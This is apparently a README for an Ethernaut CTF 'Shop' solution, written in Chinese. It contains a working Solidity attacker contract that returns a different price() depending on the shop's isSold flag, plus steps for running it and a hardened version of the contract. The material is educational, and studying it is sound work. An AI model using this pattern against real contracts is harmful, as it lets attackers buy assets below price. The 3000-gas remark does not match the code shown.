# 🏪 Ethernaut Level 21: Shop 挑戰

這是一個針對 [Ethernaut](https://ethernaut.openzeppelin.com/) 第 21 關 "Shop" 的解決方案專案。本挑戰旨在測試您對 Solidity view 函數與狀態變更之間交互作用的理解，以及如何利用這些交互來操控智能合約的行為。

## 🎯 挑戰目標

以低於商店要求價格購買商品。Shop 合約的商品定價為 100，我們需要想辦法以更低的價格購買。

## 📋 合約分析

### Shop 合約

```solidity
contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

### Buyer 介面

```solidity
interface Buyer {
    function price() external view returns (uint256);
}
```

## 🔍 漏洞分析

### 關鍵弱點

1. **介面實作漏洞**: Shop 合約依賴外部合約實作的 `price()` 函數
2. **雙重調用**: `buy()` 函數會調用 `price()` 兩次：
   - 第一次：在條件檢查中 (`_buyer.price() >= price`)
   - 第二次：更新價格時 (`price = _buyer.price()`)
3. **狀態依賴**: 兩次調用之間，`isSold` 狀態會發生變化

### 攻擊思路

由於 `price()` 是 view 函數，不能修改狀態變數。但我們可以：
- 讀取 Shop 合約的 `isSold` 狀態
- 根據 `isSold` 的值返回不同的價格
- 第一次調用時返回高價格 (≥100)
- 第二次調用時返回低價格 (<100)

## 🚀 攻擊實作

### ShopAttacker 合約

```solidity
contract ShopAttacker {
    Shop private shop;

    constructor(address _contractAddress) {
        shop = Shop(_contractAddress);
    }

    function price() public view returns (uint256) {
        if (shop.isSold() == false) {
            return 101;  // 第一次調用：通過價格檢查
        }
        return 1;        // 第二次調用：設定低價格
    }

    function buy() public {
        shop.buy();
    }
}
```

## 🛠️ 使用說明

### 環境要求

- Node.js >= 16
- Hardhat
- TypeScript

### 安裝依賴

```bash
npm install
```

### 編譯合約

```bash
npx hardhat compile
```

### 執行測試

```bash
npx hardhat test
```

### 部署到本地網路

```bash
# 啟動本地區塊鏈
npx hardhat node

# 部署合約
npx hardhat run scripts/deploy.ts --network localhost
```

### 在 Ethernaut 平台上使用

1. 開啟瀏覽器開發者工具
2. 獲取 Shop 合約實例地址：
   ```javascript
   console.log(contract.address)
   ```
3. 部署 ShopAttacker 合約（使用上述地址作為參數）
4. 調用 `buy()` 函數執行攻擊
5. 驗證結果：
   ```javascript
   await contract.price() // 應該顯示為 1
   ```

## 📚 學習要點

### Solidity 安全問題

1. **介面信任問題**: 永遠不要盲目信任外部合約的介面實作
2. **View 函數安全**: 即使是 view 函數也可能被惡意操控
3. **狀態檢查時序**: 避免在同一函數中多次調用外部函數進行關鍵決策

### Gas 限制考量

本挑戰中 `price()` 函數有 3000 gas 的限制，這限制了我們：
- 不能修改儲存狀態
- 不能執行複雜運算
- 需要使用讀取外部狀態的方式來實現條件邏輯

### 防護措施

1. **實作檢查**: 確保所有介面函數都有適當的實作
2. **單次決策**: 避免基於外部調用的結果做多次決策
3. **狀態鎖定**: 在關鍵操作期間鎖定狀態變更
4. **重入保護**: 使用重入保護機制

## 🔐 改進建議

```solidity
contract SecureShop {
    uint256 public price = 100;
    bool public isSold;
    bool private _buying; // 重入保護

    function buy(uint256 maxPrice) public payable {
        require(!_buying, "Reentrant call");
        require(!isSold, "Already sold");
        require(msg.value >= price, "Insufficient payment");
        require(maxPrice >= price, "Price too high");
        
        _buying = true;
        isSold = true;
        // 處理付款邏輯...
        _buying = false;
    }
}
```

## 📖 相關資源

- [Ethernaut 官方網站](https://ethernaut.openzeppelin.com/)
- [Solidity 文檔 - View 函數](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)
- [OpenZeppelin 合約安全指南](https://docs.openzeppelin.com/contracts/)

## 🤝 貢獻

歡迎提交 Pull Request 或開啟 Issue 來改進此專案。

## 📄 授權

本專案採用 MIT 授權條款。
